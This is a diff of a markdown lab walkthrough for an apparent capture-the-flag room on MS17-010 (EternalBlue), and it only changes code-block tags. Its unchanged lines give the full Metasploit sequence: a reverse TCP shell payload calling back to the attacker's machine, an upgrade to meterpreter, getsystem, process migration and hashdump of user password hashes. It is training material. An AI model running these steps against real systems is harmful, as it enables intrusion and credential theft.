@@ -28,7 +28,7 @@ Firstly, let’s start the target machine and give it a few minutes to start all
 First start with a straightforward nmap scan to see which ports are open and what possible path exists into the target machine.  
 
 Run nmap via the following 
-```bash  
+```bash
 sudo nmap -sS TARGET_IP
 ```   
 #### ⚙️ **Options**  
@@ -77,27 +77,27 @@ msfconsole
 ```  
 
 Now let’s see if there are any relevant modules available to us via 
-```bash
+```console
 search ms17-010
 ``` 
 this will bring back the below results.  
 ![Gain Access - search](./Images/Gain%20Access%20-%20search.png)  
 In this instance use the first result, to load this module type 
-```bash
+```console
 use 0
 ```  
 
 This will also now provide us with the answer to the first question in this section: **Find the exploitation code we will run against the machine. What is the full path of the code?**  
 
 Now that the module is loaded the options need to be configured. Firstly, let’s view the options via 
-```bash
+```console
 show options
 ```  
 ![Gain Access - Initial options](./Images/Gain%20Access%20-%20Initial%20options.png)  
 The items that need to be changed are **RHOSTS**, **LHOST** and the **Payload**  Noting that only the **RHOSTS** is empty and required to be set for the module. The **LHOST** is part of the payload options.  
 
 Do this via the following commands  
-```bash
+```console
 set RHOSTS TARGET_IP  
 set LHOST YOUR_MACHINE_IP  
 set payload windows/x64/shell/reverse_tcp
@@ -106,14 +106,14 @@ set payload windows/x64/shell/reverse_tcp
 This should give you the information to answer the next question: **Show options and set the one required value. What is the name of this value?**  
 
 Now view the options again via 
-```bash
+```console
 show options
 ``` 
 and confirm the remote and local host IPs are correct and that the payload has been adjusted as required.  
 ![Gain Access - options final](./Images/Gain%20Access%20-%20options%20final.png)  
 
 Once everything is set, type in 
-```bash
+```console
 run
 ```
 to start the attack on the target machine.  This may take a minute to complete and once done you should have access to the target machine.  
@@ -122,7 +122,7 @@ to start the attack on the target machine.  This may take a minute to complete a
 Lastly, background this session via ```CTRL + Z``` to proceed onto the next phase of the attack to escalate the standard shell to a meterpreter session.  
 
 To confirm the session has been backgrounded and is still active type in 
-```bash
+```console
 sessions -i
 ``` 
 into the main msfconsole.  
@@ -135,61 +135,61 @@ into the main msfconsole.
 Now let’s work on gaining a meterpreter session.   
 
 Firstly, load the post exploit module via the following command  
-```bash
+```console
 use post/multi/manage/shell_to_meterpreter
 ```  
 ![Escalate - Meterpreter](./Images/Escalate%20-%20Meterpreter.png)
 This will also provide you the answer to the first question in this section of the room: **What is the name of the post module we will use?**
 
 Once this module has been loaded let’s view the options via 
-```bash
+```console
 show options
 ``` 
 here there is one **Required** empty option needing to be update.  
 This will also provide you the answer to the next question: **Show options, what option are we required to change?**
 
 To set this option input 
-```bash
+```console
 set session SESSION_NUMBER
 ``` 
 you can view the active sessions via 
-```bash
+```console
 sessions -i
 ``` 
 and the session number to use is that of the standard shell on the target system. In my case this is session 1.  
 ![Escalate - Meterpreter Options set](./Images/Escalate%20-%20Meterpreter%20Options%20set.png)  
 
 Once the options have been set input 
-```bash
+```console
 run
 ``` 
 to start the module and if all has worked after a minute or so you should have an active meterpreter session.  
 This can be confirmed with 
-```bash
+```console
 sessions -i
 ``` 
 where there should now be two active sessions on the target.  
 ![Escalate Meterpreter sessions](./Images/Escalate%20Meterpreter%20sessions.png)
 
 Now follow the guide and confirm the session is running as **SYSTEM** via the 
-```bash
+```console
 getsystem
 ``` 
 command and as below it is confirmed the session is already running as **SYSTEM**  
 ![Escalate - System command](./Images/Escalate%20-%20System%20command.png)
 
 Lastly the guide mentions to migrate to a different process ID. Firstly input 
-```bash
+```console
 ps
 ``` 
 to list all running system processes which will provide the **PID** which is used to identify running system processes. This can be useful if the process meterpreter is running as does not have **SYSTEM** privileges.  
 
 It is also worth to check which process the session is running as which can be done via 
-```bash
+```console
 getpid
 ``` 
 this will provide the running meterpreter session pid and help aid understanding if migration is needed or not. Although migration may not be strictly necessary in this case, it is included to demonstrate process persistence techniques. Let’s migrate to a different process using 
-```bash
+```console
 migrate PID
 ``` 
 ![Escalate - Pid and Migrate](./Images/Escalate%20-%20Pid%20and%20Migrate.png)  
@@ -202,7 +202,7 @@ Now that access has been gained to the target machine and escalated to a meterpr
 ## 🛠️ Cracking: 
 
 Let's proceed by first dumping the hashes of the target machines user passwords. This can be done with a meterpreter command 
-```bash
+```console
 hashdump
 ```  
 
@@ -237,7 +237,7 @@ Finally let’s go and grab out flags to complete this room.
 
 I found it easier to return to the standard shell to get the flags. If needed changing sessions can be achieved via the below.  
 ```CTRL+Z``` to background the meterpreter session and then 
-```bash
+```console
 sessions -i STANDARD_SESSION_NUMBER
 ``` 
 to change back to the standard session.  
